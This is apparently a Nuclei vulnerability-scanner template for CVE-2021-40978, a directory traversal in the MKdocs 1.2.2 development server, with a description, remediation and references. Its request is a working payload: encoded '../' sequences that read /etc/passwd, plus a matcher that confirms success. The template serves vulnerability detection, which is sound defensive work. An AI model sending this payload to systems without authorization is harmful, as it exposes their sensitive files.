id: CVE-2021-40978

info:
  name: MKdocs 1.2.2 - Directory Traversal
  author: pikpikcu
  severity: high
  description: The MKdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain sensitive information. Note the vendor has disputed the vulnerability (see references) because the dev server must be used in an unsafe way (namely public) to have this vulnerability exploited.
  remediation: |
    Upgrade MKdocs to version 1.2.3 or later to fix the directory traversal vulnerability.
  reference:
    - https://github.com/mkdocs/mkdocs/pull/2604
    - https://github.com/nisdn/CVE-2021-40978
    - https://nvd.nist.gov/vuln/detail/CVE-2021-40978
    - https://github.com/mkdocs/mkdocs
    - https://github.com/mkdocs/mkdocs/issues/2601
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-40978
    cwe-id: CWE-22
    epss-score: 0.04273
    epss-percentile: 0.91312
    cpe: cpe:2.3:a:mkdocs:mkdocs:1.2.2:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: mkdocs
    product: mkdocs
  tags: cve,cve2021,mkdocs,lfi

http:
  - method: GET
    path:
      - '{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:[x*]:0:0:"

      - type: status
        status:
          - 200

# digest: 490a0046304402201f6c1f88429002d78fa76a5968a4f903a8a11795905ac65758c38e868f02a8b60220628d9633df6c26f301f0cadbc52207df0906cd686631a0615ddc4877c74670f1:922c64590222798bb761d5b6d8e72950
